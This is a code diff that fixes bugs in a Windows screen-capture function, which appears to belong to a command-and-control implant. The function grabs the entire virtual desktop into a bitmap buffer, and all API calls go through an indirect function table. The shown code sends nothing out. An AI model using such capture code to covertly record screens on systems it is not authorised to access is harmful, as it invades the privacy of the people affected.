@@ -1056,41 +1056,35 @@ BOOL WinScreenshot(
     BITMAPFILEHEADER    BitFileHdr  = { 0 };
     BITMAPINFOHEADER    BitInfoHdr  = { 0 };
     BITMAPINFO          BitMapInfo  = { 0 };
-    HGDIOBJ             hTempMap    = NULL;
     HBITMAP             hBitmap     = NULL;
-    BITMAP              AllDesktops = { 0 };
-    HDC                 hDC, hMemDC = NULL;
+    HDC                 hDC         = NULL;
+    HDC                 hMemDC      = NULL;
     BYTE*               bBits       = NULL;
     DWORD               cbBits      = 0;
     BOOL                ReturnValue = FALSE;
-    HGDIOBJ             ObjPtr      = NULL;
+    HGDIOBJ             OldBmp      = NULL;
 
     PVOID               BitMapImage = NULL;
     DWORD               BitMapSize  = 0;
 
-    // NOTE: if GetSystemMetrics fails, screenshot works anyways
-    INT x = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
-    INT y = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
+    /* Use SM_CX/CYVIRTUALSCREEN for extent; avoid GetCurrentObject+DeleteObject on the display DC bitmap (invalid + wrong size on some sessions). */
+    INT x      = Instance->Win32.GetSystemMetrics( SM_XVIRTUALSCREEN );
+    INT y      = Instance->Win32.GetSystemMetrics( SM_YVIRTUALSCREEN );
+    INT width  = Instance->Win32.GetSystemMetrics( SM_CXVIRTUALSCREEN );
+    INT height = Instance->Win32.GetSystemMetrics( SM_CYVIRTUALSCREEN );
+
+    if ( width <= 0 || height <= 0 ) {
+        PUTS( "GetSystemMetrics virtual screen size invalid" )
+        goto Cleanup;
+    }
 
     MemSet( &BitFileHdr, 0, sizeof( BITMAPFILEHEADER ) );
     MemSet( &BitInfoHdr, 0, sizeof( BITMAPINFOHEADER ) );
     MemSet( &BitMapInfo, 0, sizeof( BITMAPINFO ) );
-    MemSet( &AllDesktops,0, sizeof( BITMAP ) );
 
     hDC = Instance->Win32.GetDC( NULL );
     if ( ! hDC ) {
         PUTS( "GetDC failed" )
-        goto Cleanup;
-    }
-
-    hTempMap = Instance->Win32.GetCurrentObject( hDC, OBJ_BITMAP );
-    if ( ! hTempMap ) {
-        PUTS( "GetCurrentObject failed" )
-        goto Cleanup;
-    }
-
-    if ( ! Instance->Win32.GetObjectW( hTempMap, sizeof( BITMAP ), &AllDesktops ) ) {
-        PUTS( "GetObjectW failed" )
         goto Cleanup;
     }
 
@@ -1100,15 +1094,19 @@ BOOL WinScreenshot(
     BitInfoHdr.biBitCount    = 24;
     BitInfoHdr.biCompression = BI_RGB;
     BitInfoHdr.biPlanes      = 1;
-    BitInfoHdr.biWidth       = AllDesktops.bmWidth;
-    BitInfoHdr.biHeight      = AllDesktops.bmHeight;
+    BitInfoHdr.biWidth       = width;
+    BitInfoHdr.biHeight      = height;
 
     BitMapInfo.bmiHeader     = BitInfoHdr;
 
-    cbBits     = ( ( ( 24 * AllDesktops.bmWidth + 31 ) &~31 ) / 8 ) * AllDesktops.bmHeight;
+    cbBits     = ( ( ( 24 * width + 31 ) &~31 ) / 8 ) * height;
 
     BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
     BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );
+    if ( ! BitMapImage ) {
+        PUTS( "LocalAlloc failed" )
+        goto Cleanup;
+    }
 
     hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
     if ( ! hMemDC ) {
@@ -1122,13 +1120,13 @@ BOOL WinScreenshot(
         goto Cleanup;
     }
 
-    ObjPtr = Instance->Win32.SelectObject( hMemDC, hBitmap );
-    if ( ! ObjPtr || ObjPtr == HGDI_ERROR ) {
+    OldBmp = Instance->Win32.SelectObject( hMemDC, hBitmap );
+    if ( ! OldBmp || OldBmp == HGDI_ERROR ) {
         PUTS( "SelectObject failed" )
         goto Cleanup;
     }
 
-    if ( ! Instance->Win32.BitBlt( hMemDC, 0, 0, AllDesktops.bmWidth, AllDesktops.bmHeight, hDC, x, y, SRCCOPY ) ) {
+    if ( ! Instance->Win32.BitBlt( hMemDC, 0, 0, width, height, hDC, x, y, SRCCOPY ) ) {
         PUTS( "BitBlt failed" )
         goto Cleanup;
     }
@@ -1141,14 +1139,23 @@ BOOL WinScreenshot(
 
 Cleanup:
 
+    if ( ! ReturnValue && BitMapImage ) {
+        Instance->Win32.LocalFree( BitMapImage );
+        BitMapImage = NULL;
+        BitMapSize  = 0;
+    }
+
     if ( ImagePointer )
         *ImagePointer = BitMapImage;
 
     if ( ImageSize )
         *ImageSize = BitMapSize;
 
-    if ( hTempMap ) {
-        Instance->Win32.DeleteObject( hTempMap );
+    if ( hBitmap ) {
+        if ( hMemDC && OldBmp && OldBmp != HGDI_ERROR ) {
+            Instance->Win32.SelectObject( hMemDC, OldBmp );
+        }
+        Instance->Win32.DeleteObject( hBitmap );
     }
 
     if ( hMemDC ) {
@@ -1157,10 +1164,6 @@ Cleanup:
 
     if ( hDC ) {
         Instance->Win32.ReleaseDC( NULL, hDC );
-    }
-
-    if ( hBitmap ) {
-        Instance->Win32.DeleteObject( hBitmap );
     }
 
     return ReturnValue;
